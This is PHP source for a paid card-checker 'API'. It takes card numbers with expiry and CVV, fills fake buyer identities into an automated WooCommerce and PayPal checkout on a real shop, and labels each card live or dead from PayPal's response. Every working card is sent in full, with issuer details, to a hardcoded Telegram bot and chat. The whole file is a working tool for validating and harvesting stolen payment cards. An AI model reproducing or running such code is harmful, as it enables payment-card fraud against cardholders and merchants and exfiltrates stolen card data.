<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Content-Type: text/plain');
    die("❌ Sadece POST istekleri kabul edilir");
}

function validateKey($key) {
    if (empty($key)) {
        return false;
    }
    
    // İsteğiniz üzerine dosya yolu doğrudan tanımlandı, hashleme kaldırıldı.
    $keysFile = '../users/bbbba.json';
    
    if (!file_exists($keysFile)) {
        return false;
    }
    
    $data = json_decode(file_get_contents($keysFile), true);
    if (!$data || !isset($data['keys'])) {
        return false;
    }
    
    foreach ($data['keys'] as $keyData) {
        if ($keyData['key'] === $key && $keyData['isActive']) {
            $expirationDate = new DateTime($keyData['expiresAt']);
            $currentDate = new DateTime();
            
            if ($currentDate <= $expirationDate) {
                return true;
            }
        }
    }
    
    return false;
}

$userKey = $_POST['key'] ?? '';
if (!validateKey($userKey)) {
    header('Content-Type: text/plain');
    die("❌ Geçersiz veya süresi dolmuş key! API erişimi reddedildi.");
}

define('Z', "\033[1;31m"); 
define('F', "\033[2;32m");
define('B', "\033[2;36m");
define('X', "\033[1;33m");
define('C', "\033[2;35m");
define('W', "\033[2;37m");
define('Y', "\033[1;34m");

function generate_full_name() {
    $first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha"];

    $last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                  "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"];

    $first_name = $first_names[array_rand($first_names)];
    $last_name = $last_names[array_rand($last_names)];

    return [$first_name, $last_name];
}

function generate_address() {
    $cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"];
    $states = ["NY", "CA", "IL", "TX", "AZ"];
    $streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"];
    $zip_codes = ["10001", "90001", "60601", "77001", "85001"];

    $city_index = array_rand($cities);
    $city = $cities[$city_index];
    $state = $states[$city_index];
    $street_address = rand(1, 999) . " " . $streets[array_rand($streets)];
    $zip_code = $zip_codes[$city_index];

    return [$city, $state, $street_address, $zip_code];
}

function generate_random_account() {
    $chars = 'abcdefghijklmnopqrstuvwxyz';
    $name = '';
    for ($i = 0; $i < 20; $i++) {
        $name .= $chars[rand(0, strlen($chars) - 1)];
    }
    $number = rand(1000, 9999);
    return $name . $number . "@gmail.com";
}

function generate_phone() {
    return "303" . rand(1000000, 9999999);
}

function generate_random_string($length) {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $result;
}

function generate_user_agent() {
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36';
}

function send_to_telegram($card_data, $result, $bin_data) {
    $bot_token = '8066679823:AAGuUDujD3BKx_MXCUrwP6eBMZcTrYhB9MM';
    $chat_id = '-1002754106820';
    
    $card_parts = explode('|', $card_data);
    $card_number = $card_parts[0];
    
    // Gerçek yanıt mesajını $result'tan alıyoruz (Örn: "Response: CHARGED")
    $response_message = $result['message'];
    // 'Response: ' kısmını kaldırıp sadece dinamik yanıtı alıyoruz (Örn: CHARGED)
    $dynamic_response = str_replace('Response: ', '', $response_message);
    
    $message = "🌐 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅\n\n";
    $message .= "𝗖𝗮𝗿𝗱: $card_data\n";
    $message .= "𝐆𝐚𝐭𝐞𝐰𝐚𝐲: PayPal ₺1\n";
    $message .= "𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {$dynamic_response}\n\n"; // Dinamik yanıtı kullandık
    $message .= "𝗜𝗻𝗳𝗼: {$bin_data['Scheme']} - {$bin_data['Type']} - {$bin_data['CardTier']}\n";
    $message .= "Bank: {$bin_data['Issuer']}\n";
    $message .= "𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {$bin_data['Country']['Name']}\n\n";
    $message .= "𝗧𝗶𝗺𝗲: " . date('Y-m-d H:i:s') . "\n";
    
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded'],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($response, true);
}

function get_bin_data($card_number) {
    $bin = substr($card_number, 0, 6);
    $url = "https://data.handyapi.com/bin/$bin";
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($response, true);
}

function process_card($card_data) {
    $parts = explode('|', $card_data);

    if (count($parts) < 4) {
        return ['status' => 'DECLINED', 'message' => 'Invalid card format'];
    }

    $n = trim($parts[0]);
    $mm = trim($parts[1]);
    $yy = trim($parts[2]);
    $cvc = trim($parts[3]);

    if (!preg_match('/^\d{13,19}$/', $n)) {
        return ['status' => 'DECLINED', 'message' => 'Invalid card number'];
    }

    if (strlen($mm) == 1) {
        $mm = '0' . $mm;
    }

    if (strpos($yy, '20') !== false) {
        $yy = substr($yy, 2);
    }
    
    $bin_data = get_bin_data($n);
    if (!$bin_data || $bin_data['Status'] !== 'SUCCESS') {
        $bin_data = [
            'Scheme' => 'UNKNOWN',
            'Type' => 'UNKNOWN',
            'CardTier' => 'UNKNOWN',
            'Issuer' => 'UNKNOWN',
            'Country' => ['Name' => 'UNKNOWN']
        ];
    }

    list($first_name, $last_name) = generate_full_name();
    list($city, $state, $street_address, $zip_code) = generate_address();
    $acc = generate_random_account();
    $num = generate_phone();
    $user = generate_user_agent();

    $ch = curl_init();
    $cookieJar = tempnam(sys_get_temp_dir(), 'cookies');

    try {
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://switchupcb.com/shop/i-buy/',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => 'quantity=1&add-to-cart=4451',
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTPHEADER => [
                'authority: switchupcb.com',
                'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type: application/x-www-form-urlencoded',
                'origin: https://switchupcb.com',
                'referer: https://switchupcb.com/shop/i-buy/',
                'user-agent: ' . $user,
            ],
            CURLOPT_COOKIEJAR => $cookieJar,
            CURLOPT_COOKIEFILE => $cookieJar,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
        ]);

        $response = curl_exec($ch);

        if (curl_error($ch)) {
            throw new Exception('Connection error');
        }

        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://switchupcb.com/checkout/',
            CURLOPT_POST => false,
            CURLOPT_HTTPHEADER => [
                'authority: switchupcb.com',
                'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'referer: https://switchupcb.com/cart/',
                'user-agent: ' . $user,
            ],
        ]);

        $response = curl_exec($ch);

        preg_match('/update_order_review_nonce":"(.*?)"/', $response, $sec_matches);
        preg_match('/save_checkout_form.*?nonce":"(.*?)"/', $response, $nonce_matches);
        preg_match('/name="woocommerce-process-checkout-nonce" value="(.*?)"/', $response, $check_matches);
        preg_match('/create_order.*?nonce":"(.*?)"/', $response, $create_matches);

        if (!isset($sec_matches[1]) || !isset($check_matches[1]) || !isset($create_matches[1])) {
            return ['status' => 'DECLINED', 'message' => 'Gateway error'];
        }

        $sec = $sec_matches[1];
        $check = $check_matches[1];
        $create = $create_matches[1];

        $data = "security=$sec&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=billing_first_name=" . urlencode($first_name) . "&billing_last_name=" . urlencode($last_name) . "&billing_country=US&billing_address_1=New+York&billing_city=New+York&billing_state=NY&billing_postcode=10080&billing_phone=$num&billing_email=" . urlencode($acc) . "&payment_method=stripe&woocommerce-process-checkout-nonce=$check";

        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://switchupcb.com/?wc-ajax=update_order_review',
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_HTTPHEADER => [
                'authority: switchupcb.com',
                'accept: */*',
                'content-type: application/x-www-form-urlencoded; charset=UTF-8',
                'origin: https://switchupcb.com',
                'referer: https://switchupcb.com/checkout/',
                'user-agent: ' . $user,
            ],
        ]);

        $response = curl_exec($ch);

        $json_data = [
            'nonce' => $create,
            'payer' => null,
            'bn_code' => 'Woo_PPCP',
            'context' => 'checkout',
            'order_id' => '0',
            'payment_method' => 'ppcp-gateway',
            'funding_source' => 'card',
            'form_encoded' => "billing_first_name=$first_name&billing_last_name=$last_name&billing_country=US&billing_address_1=" . urlencode($street_address) . "&billing_city=$city&billing_state=$state&billing_postcode=$zip_code&billing_phone=$num&billing_email=" . urlencode($acc) . "&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce=$check",
            'createaccount' => false,
            'save_payment_method' => false,
        ];

        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://switchupcb.com/?wc-ajax=ppc-create-order',
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($json_data),
            CURLOPT_HTTPHEADER => [
                'authority: switchupcb.com',
                'accept: */*',
                'content-type: application/json',
                'origin: https://switchupcb.com',
                'referer: https://switchupcb.com/checkout/',
                'user-agent: ' . $user,
            ],
        ]);

        $response = curl_exec($ch);
        $response_data = json_decode($response, true);

        if (!isset($response_data['data']['id'])) {
            return ['status' => 'DECLINED', 'message' => 'Gateway error'];
        }

        $id = $response_data['data']['id'];

        $lol1 = generate_random_string(10);
        $lol2 = generate_random_string(10);
        $lol3 = generate_random_string(11);
        $session_id = "uid_{$lol1}_{$lol3}";
        $button_session_id = "uid_{$lol2}_{$lol3}";

        curl_setopt_array($ch, [
            CURLOPT_URL => "https://www.paypal.com/smart/card-fields?sessionID=$session_id&buttonSessionID=$button_session_id&token=$id",
            CURLOPT_POST => false,
            CURLOPT_HTTPHEADER => [
                'authority: www.paypal.com',
                'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent: ' . $user,
            ],
        ]);

        $response = curl_exec($ch);

        $payment_data = [
            'query' => '
            mutation payWithCard(
                $token: String!
                $card: CardInput!
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }',
            'variables' => [
                'token' => $id,
                'card' => [
                    'cardNumber' => $n,
                    'type' => $bin_data['Scheme'] ?? 'VISA',
                    'expirationDate' => $mm . '/20' . $yy,
                    'postalCode' => $zip_code,
                    'securityCode' => $cvc,
                ],
                'firstName' => $first_name,
                'lastName' => $last_name,
                'billingAddress' => [
                    'givenName' => $first_name,
                    'familyName' => $last_name,
                    'line1' => 'New York',
                    'line2' => null,
                    'city' => 'New York',
                    'state' => 'NY',
                    'postalCode' => '10080',
                    'country' => 'US',
                ],
                'email' => $acc,
                'currencyConversionType' => 'VENDOR',
            ],
            'operationName' => null,
        ];

        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://www.paypal.com/graphql?fetch_credit_form_submit',
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($payment_data),
            CURLOPT_HTTPHEADER => [
                'authority: www.paypal.com',
                'accept: */*',
                'content-type: application/json',
                'user-agent: ' . $user,
            ],
        ]);

        $last = curl_exec($ch);

        if (strpos($last, 'ADD_SHIPPING_ERROR') !== false ||
            strpos($last, 'NEED_CREDIT_CARD') !== false ||
            strpos($last, '"status": "succeeded"') !== false ||
            strpos($last, 'Thank You For Donation.') !== false ||
            strpos($last, 'Your payment has already been processed') !== false ||
            strpos($last, 'Success ') !== false) {
            
            $result = ['status' => '✅ Approved', 'message' => 'Response: CHARGED'];
            send_to_telegram($card_data, $result, $bin_data);
            return $result;

        } elseif (strpos($last, 'is3DSecureRequired') !== false || strpos($last, 'OTP') !== false) {
            
            $result = ['status' => '✅ Approved', 'message' => 'Response: 3D SECURE'];
            send_to_telegram($card_data, $result, $bin_data);
            return $result;

        } elseif (strpos($last, 'INVALID_SECURITY_CODE') !== false) {
            
            $result = ['status' => '✅ Approved', 'message' => 'Response: CCN MISMATCH'];
            send_to_telegram($card_data, $result, $bin_data);
            return $result;

        } elseif (strpos($last, 'INVALID_BILLING_ADDRESS') !== false) {
            
            $result = ['status' => '✅ Approved', 'message' => 'Response: AVS MISMATCH'];
            send_to_telegram($card_data, $result, $bin_data);
            return $result;

        } elseif (strpos($last, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
            
            $result = ['status' => '✅ Approved', 'message' => 'Response: RESTRICTED'];
            send_to_telegram($card_data, $result, $bin_data);
            return $result;

        } else {
            $response_json = json_decode($last, true);
            if (isset($response_json['errors'][0]['message']) && isset($response_json['errors'][0]['data'][0]['code'])) {
                $message = $response_json['errors'][0]['message'];
                $code = $response_json['errors'][0]['data'][0]['code'];
                return ['status' => '❌ Dead', 'message' => "Response: $message($code)"];
            } else {
                return ['status' => '❌ Dead', 'message' => 'Response: CARD DECLINED'];
            }
        }

    } catch (Exception $e) {
        return ['status' => '❌ Dead', 'message' => 'Response: GATEWAY ERROR'];
    } finally {
        curl_close($ch);
        if (file_exists($cookieJar)) {
            unlink($cookieJar);
        }
    }
}

$card_data = $_POST['card'] ?? null;

if (!$card_data || trim($card_data) === '') {
    exit("❌ Kart bilgisi eksik");
}

$cardParts = explode('|', $card_data);
if (count($cardParts) < 4) {
    exit("❌ Geçersiz kart formatı | Doğru format: 4444555566667777|12|28|123");
}

$cvv = trim($cardParts[3]);
if ($cvv === '000') {
    exit("❌ Declined | $card_data | Autha Genmi Koyulur Yarram | Api Service");
}

header('Content-Type: text/plain');

$result = process_card($card_data);

echo $result['status'] . " | $card_data | " . $result['message'] . " | ";
?>